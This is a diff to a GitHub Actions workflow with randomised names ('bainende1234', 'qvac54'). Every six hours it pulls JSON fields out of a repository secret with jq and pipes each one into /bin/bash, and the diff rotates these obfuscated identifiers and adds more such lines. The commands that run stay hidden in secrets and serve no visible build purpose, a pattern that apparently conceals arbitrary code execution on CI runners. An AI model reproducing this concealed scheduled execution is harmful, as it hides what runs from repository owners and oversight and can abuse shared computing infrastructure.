@@ -1,24 +1,30 @@
 name: bainende1234
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 3/6 * * *'
+    - cron: '7 0/6 * * *'
 
-jobs:  # 29845
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: bainende1234
         env:
-          mag17: ${{ secrets.mag17 }}
+          qvac54: ${{ secrets.qvac54 }}
         run: |
-          echo $mag17 | jq -r .ii92233 | /bin/bash
-          echo $d61743 | jq -r .v10 | /bin/bash
-          echo $lcr8 | jq -r .gi2871 | /bin/bash
-          echo $okvb69467 | jq -r .liprm722 | /bin/bash
-          echo $ppwh4 | jq -r .inc4460 | /bin/bash
-          echo $yjes7 | jq -r .gag821 | /bin/bash
-          echo $qyf8 | jq -r .vtqt450 | /bin/bash
+          echo $qvac54 | jq -r .x2 | /bin/bash
+          echo $ye242 | jq -r .tbu528 | /bin/bash
+          echo $h5 | jq -r .tdmwb20496 | /bin/bash
+          echo $hyu52142 | jq -r .xsrg63 | /bin/bash
+          echo $fx321 | jq -r .lc770 | /bin/bash
+          echo $ujgpy3 | jq -r .py333 | /bin/bash
+          echo $bhsf912 | jq -r .fifg715 | /bin/bash
+          echo $fsom1364 | jq -r .o91 | /bin/bash
+          echo $sb3 | jq -r .amgoz00 | /bin/bash
+          echo $xys96 | jq -r .rxmu1205 | /bin/bash
+          echo $o5 | jq -r .sbt783 | /bin/bash
+          echo $s83136 | jq -r .kjrjn62862 | /bin/bash
+          echo $rdegh6 | jq -r .wjiz82 | /bin/bash
 
